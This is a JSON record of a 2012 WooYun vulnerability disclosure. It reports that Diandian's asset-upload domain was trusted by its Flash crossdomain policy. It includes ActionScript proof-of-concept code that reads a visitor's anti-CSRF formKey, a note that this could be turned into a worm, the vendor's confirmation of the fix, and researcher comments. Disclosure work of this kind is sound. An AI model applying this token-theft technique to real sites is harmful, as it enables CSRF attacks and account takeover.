{"id": 18328, "wybug_id": "wooyun-2012-09056", "wybug_title": "点点网formKey泄露", "wybug_corp": "点点网", "wybug_author": "p.z", "wybug_date": "2012-06-30 10:29", "wybug_open_date": "2012-08-14 10:30", "wybug_type": "应用配置错误", "wybug_level": "高", "wybug_rank_0": "14", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-06-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-07-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-07-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-07-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-07-31：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-08-14：\t细节向公众公开  简要描述：  详细说明：  模版静态资源上传页面（http://www.diandian.com/upload/asset）和Flash跨域通信的配置文件中（http://www.diandain.com/crossdomain.xml）允许的域名相同，只需上传一个SWF，就可以读到formKey了。把这SWF嵌入到blog页面中，读到访客的formKey，调用externalInterface把值给输到JS里，又能worm了吧。   漏洞证明：  http://x.libdd.com/farm1/f15341/7cef03a1/diandian.swf\nvar result_txt = new TextField();result_txt.x = 0;result_txt.y = 0;result_txt.height = 22;result_txt.width = 200;addChild(result_txt);var targetURL:String=\"http://www.diandian.com/home\";var request:URLRequest=new URLRequest(targetURL);request.method=URLRequestMethod.GET;var loader:URLLoader=new URLLoader();loader.addEventListener(Event.COMPLETE,completeHandler);function completeHandler(event:Event){  var formKey:String = loader.data;  formKey = formKey.split(\"window.DDformKey = '\")[1].split(\"'\")[0]  result_txt.text = formKey}loader.load(request)\n效果就这样：\n\n   修复方案：  改配置文件？改存储静态文件的域名？   版权声明：转载请注明来源 p.z@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2012-07-01 00:54 厂商回复： 再一次感谢p.z帮助发现一个高危漏洞.随着业务发展, 原来完全由点点控制的域名下也开始有用户脚本. 当时权限放的太开, 考虑不周.线上目前已经修复. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-06-30 19:36 |    \t\t顺子 \t\t\t( 普通白帽子  |\t\t\t        Rank:236 漏洞数:36        | 0-0努力像正常青年靠近，再也不当上错图的2...)\t\t \n  哈哈，这东西当时我也看到了，但是不知道是神马~~求大牛科目    \n     2012-07-01 08:54 |    \t\tp.z  \t\t\t( 普通白帽子  |\t\t\t        Rank:411 漏洞数:40        )\t\t \n  @顺子 DDformKey应该就是点点防止CSRF的一个token，这串token只在www域下才出现在源码中，所以拿到xxx.diandian.com这类的xss基本没有什么作用，因为拿不到formKey，就不能csrf修改访客的博客设置。    \n     2012-07-01 09:16 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @p.z 恩， xxx.diandian.com 本身就是开放自定义JS功能的，所以formkey就是唯一的一道防线了。得formkey者得点点。。    \n     2012-07-01 11:34 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  @顺子 相当于腾讯的g_tk 腾讯g_tk固定算法的...    \n     2012-07-01 17:11 |    \t\t顺子 \t\t\t( 普通白帽子  |\t\t\t        Rank:236 漏洞数:36        | 0-0努力像正常青年靠近，再也不当上错图的2...)\t\t \n  谢谢大牛科普了    \n     2012-07-11 08:45 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n   = =难怪俺去上传flash的时候，上传不了了。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}